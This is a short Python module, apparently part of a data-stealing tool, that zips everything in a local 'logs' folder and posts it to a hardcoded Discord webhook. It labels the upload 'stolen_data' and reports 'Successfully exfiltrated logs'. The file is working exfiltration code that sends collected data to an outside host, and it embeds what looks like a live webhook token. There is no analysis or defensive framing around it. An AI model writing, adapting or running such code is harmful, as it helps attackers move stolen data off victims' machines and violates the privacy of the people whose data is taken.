# To export the collected data to Discord server

import os
import zipfile
import requests
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1391150458508153075/2FBGX_CuG15yaaDTszfqfgOrcEaEv5HzyrGNZpBDN7XViIegUKWyuG5J2gENwRbY1zXk"  

def zip_logs(zip_filename="logs.zip"):
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for root, _, files in os.walk("logs"):
            for file in files:
                zipf.write(os.path.join(root, file),
                           arcname=os.path.join(root, file))

def send_to_discord_webhook():
    zip_logs()
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

    with open("logs.zip", "rb") as f:
        files = {"file": (f"stolen_data_{now}.zip", f)}
        data = {"content": "📦 New Exfiltrated Logs"}
        try:
            response = requests.post(WEBHOOK_URL, data=data, files=files)
            if response.status_code in [200, 204]:
                print("[+] Successfully exfiltrated logs.")
            else:
                print(f"[!] Failed with code {response.status_code}")
        except Exception as e:
            print(f"[!] Error sending logs: {e}")
